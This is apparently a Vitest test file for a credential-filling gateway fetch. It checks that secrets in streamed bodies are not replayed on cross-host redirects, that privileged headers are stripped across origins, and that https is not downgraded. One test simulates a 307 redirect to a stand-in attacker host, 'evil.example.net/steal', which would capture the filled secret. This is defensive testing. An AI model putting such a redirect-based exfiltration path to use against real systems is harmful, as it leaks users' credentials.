import { ownerIdFromStored } from '@kody-internal/shared/owner-person-ids.ts'
import { beforeEach, expect, test, vi } from 'vitest'
import { lookupSecretsThroughResolveSecret } from '#worker/test-support/secret-lookup.ts'
import { sessionRequestContext } from '#worker/test-support/request-context.ts'
import { executeGatewayFetch } from '#mcp/fetch-gateway.ts'
import * as secretService from '#mcp/secrets/service.ts'
import {
	isActiveOrgQuery,
	isOrgBindingMembershipQuery,
	mockPersonalOrgBindingRow,
} from '#worker/test-support/org-binding-query.ts'
import { createInMemoryUserMeterEnv } from '#worker/test-support/user-meter.ts'
import * as usageModule from '#worker/usage/record-usage.ts'

// These cases cover fills the owner has opted in to; enforcement of the
// opt-in itself is covered in fill-placement-enforcement.node.test.ts.
vi.mock(
	'#worker/credentials/fill-placement-opt-ins.ts',
	async (importOriginal) => ({
		...(await importOriginal<
			typeof import('#worker/credentials/fill-placement-opt-ins.ts')
		>()),
		readFillPlacementOptIn: async () => ({
			query: true,
			path: true,
			body: true,
		}),
	}),
)

const userMeter = createInMemoryUserMeterEnv()
const env = {
	APP_DB: {
		prepare(query: string) {
			const normalizedQuery = query.replace(/\s+/g, ' ').trim().toLowerCase()
			return {
				bind(...params: Array<unknown>) {
					return {
						async run() {
							return { meta: { changes: 1 } }
						},
						async first() {
							if (isActiveOrgQuery(normalizedQuery)) return { ok: 1 }
							if (isOrgBindingMembershipQuery(normalizedQuery)) {
								return mockPersonalOrgBindingRow(String(params[1]), 'ada')
							}
							if (
								normalizedQuery.includes('where stable_user_id') &&
								params[0] !== 'user-123'
							) {
								throw new Error(
									'Account reverse-resolution must bind the acting userId.',
								)
							}
							return null
						},
						async all() {
							return { results: [], meta: { changes: 0 } }
						},
					}
				},
			}
		},
	} as unknown as D1Database,
	...userMeter.env,
	COOKIE_SECRET: 'test-cookie-secret',
	SECRET_STORE_KEY: 'test-secret-store-key-32-chars-minimum',
	// Opt out of credential-resolution audit writes in this fixture.
	SENTRY_ENVIRONMENT: 'test',
} as unknown as Env

const props = {
	baseUrl: 'https://example.com',
	userId: ownerIdFromStored('user-123'),
	email: null,
	request: sessionRequestContext('user-123', 'ada'),
	storageContext: null,
}

function userSecret(
	value: string,
	allowedHosts: Array<string>,
	allowedPackages: Array<string> = [],
): secretService.ResolvedSecret {
	return {
		credentialId: `cred-${value}`,
		found: true,
		value,
		scope: 'user',
		allowedHosts,
		allowedPackages,
		placement: null,
	}
}

beforeEach(() => {
	lookupSecretsThroughResolveSecret()
})

test('stream body credential in a later chunk does not follow 307 to another host', async () => {
	vi.spyOn(usageModule, 'recordUsage').mockResolvedValue(undefined)
	vi.spyOn(secretService, 'resolveSecret').mockResolvedValue(
		userSecret('super-secret-token', ['api.example.com']),
	)
	const encoder = new TextEncoder()
	const body = new ReadableStream<Uint8Array>({
		start(controller) {
			// First chunk has no credential-shaped opener; the placeholder is
			// only in a later chunk (the peek hole this hardens).
			controller.enqueue(encoder.encode('prefix-data-without-opener-'))
			controller.enqueue(encoder.encode('{{secret:apiToken}}'))
			controller.close()
		},
	})
	const fetchStub = vi.fn(async (request: Request): Promise<Response> => {
		if (new URL(request.url).hostname === 'evil.example.net') {
			const stolen = await request.text()
			return new Response(stolen, { status: 200 })
		}
		const text = await request.text()
		expect(text).toBe('prefix-data-without-opener-super-secret-token')
		const redirect = new Response(null, {
			status: 307,
			headers: { Location: 'https://evil.example.net/steal' },
		})
		// Simulate runtime redirect=follow replaying the filled body.
		if (request.redirect === 'follow') {
			return fetchStub(
				new Request('https://evil.example.net/steal', {
					method: request.method,
					headers: request.headers,
					body: text,
					redirect: 'follow',
				}),
			)
		}
		return redirect
	})
	const response = await executeGatewayFetch({
		env,
		props,
		request: new Request('https://api.example.com/upload', {
			method: 'POST',
			headers: { 'Content-Type': 'text/plain' },
			body,
			redirect: 'follow',
			duplex: 'half',
		} as RequestInit & { duplex: 'half' }),
		globalFetch: fetchStub as unknown as typeof fetch,
	})
	expect(fetchStub).toHaveBeenCalledTimes(1)
	expect(fetchStub.mock.calls[0]?.[0]?.url).toBe(
		'https://api.example.com/upload',
	)
	expect(fetchStub.mock.calls[0]?.[0]?.redirect).toBe('manual')
	expect(response.status).toBe(307)
	expect(response.headers.get('location')).toBe(
		'https://evil.example.net/steal',
	)
})

test('ordinary streamed POST without credentials still follows a 302', async () => {
	vi.spyOn(usageModule, 'recordUsage').mockResolvedValue(undefined)
	const encoder = new TextEncoder()
	const body = new ReadableStream<Uint8Array>({
		start(controller) {
			controller.enqueue(encoder.encode('hello-'))
			controller.enqueue(encoder.encode('world'))
			controller.close()
		},
	})
	const fetchStub = vi.fn(async (request: Request) => {
		if (request.url.endsWith('/final')) {
			expect(request.method).toBe('GET')
			return new Response('landed', { status: 200 })
		}
		expect(await request.text()).toBe('hello-world')
		return new Response(null, {
			status: 302,
			headers: { Location: 'https://api.example.com/final' },
		})
	})
	const response = await executeGatewayFetch({
		env,
		props,
		request: new Request('https://api.example.com/start', {
			method: 'POST',
			headers: { 'Content-Type': 'text/plain' },
			body,
			redirect: 'follow',
			duplex: 'half',
		} as RequestInit & { duplex: 'half' }),
		globalFetch: fetchStub as unknown as typeof fetch,
	})
	expect(response.status).toBe(200)
	expect(response.redirected).toBe(true)
	expect(await response.text()).toBe('landed')
	expect(fetchStub).toHaveBeenCalledTimes(2)
	expect(fetchStub.mock.calls[0]?.[0]?.redirect).toBe('manual')
	expect(fetchStub.mock.calls[1]?.[0]?.url).toBe(
		'https://api.example.com/final',
	)
})

test('ordinary redirect follow strips privileged headers across origins', async () => {
	vi.spyOn(usageModule, 'recordUsage').mockResolvedValue(undefined)
	const fetchStub = vi.fn(async (request: Request) => {
		if (request.url.includes('other.example.net')) {
			expect(request.headers.get('authorization')).toBeNull()
			expect(request.headers.get('cookie')).toBeNull()
			expect(request.headers.get('proxy-authorization')).toBeNull()
			expect(request.headers.get('x-custom')).toBe('keep')
			return new Response('ok', { status: 200 })
		}
		return new Response(null, {
			status: 302,
			headers: { Location: 'https://other.example.net/next' },
		})
	})
	const response = await executeGatewayFetch({
		env,
		props,
		request: new Request('https://api.example.com/start', {
			method: 'POST',
			headers: {
				Authorization: 'Bearer caller-token',
				Cookie: 'session=1',
				'Proxy-Authorization': 'Basic abc',
				'X-Custom': 'keep',
				'Content-Type': 'text/plain',
			},
			body: 'ping',
			redirect: 'follow',
		}),
		globalFetch: fetchStub as unknown as typeof fetch,
	})
	expect(response.status).toBe(200)
	expect(fetchStub).toHaveBeenCalledTimes(2)
})

test('ordinary redirect follow does not downgrade https to http', async () => {
	vi.spyOn(usageModule, 'recordUsage').mockResolvedValue(undefined)
	const fetchStub = vi.fn(async () => {
		return new Response(null, {
			status: 302,
			headers: { Location: 'http://api.example.com/insecure' },
		})
	})
	const response = await executeGatewayFetch({
		env,
		props,
		request: new Request('https://api.example.com/start', {
			method: 'POST',
			headers: { 'Content-Type': 'text/plain' },
			body: 'ping',
			redirect: 'follow',
		}),
		globalFetch: fetchStub as unknown as typeof fetch,
	})
	expect(response.status).toBe(302)
	expect(fetchStub).toHaveBeenCalledTimes(1)
	expect(response.headers.get('location')).toBe(
		'http://api.example.com/insecure',
	)
})
